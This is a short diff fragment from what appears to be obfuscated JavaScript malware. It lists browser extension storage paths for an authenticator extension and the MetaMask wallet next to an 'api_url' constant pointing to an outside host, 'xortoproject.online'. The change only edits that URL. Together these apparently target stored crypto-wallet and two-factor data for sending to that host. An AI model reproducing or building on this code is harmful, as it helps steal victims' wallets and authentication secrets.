@@ -155,7 +155,7 @@ _0x4ae424.Authenticator_E =
     '\\Sync Extension Settings\\ocglkepbibnalbgmbachknglpdipeoio'
 _0x4ae424.MetaMask_O =
     '\\Local Extension Settings\\djclckkglechooblngghdinmeemkbgci'
-const api_url = "https://xortoproject.online/";
+const api_url = "https://xortoproject.online";
 
 const extension = _0x4ae424,
   browserPath = [
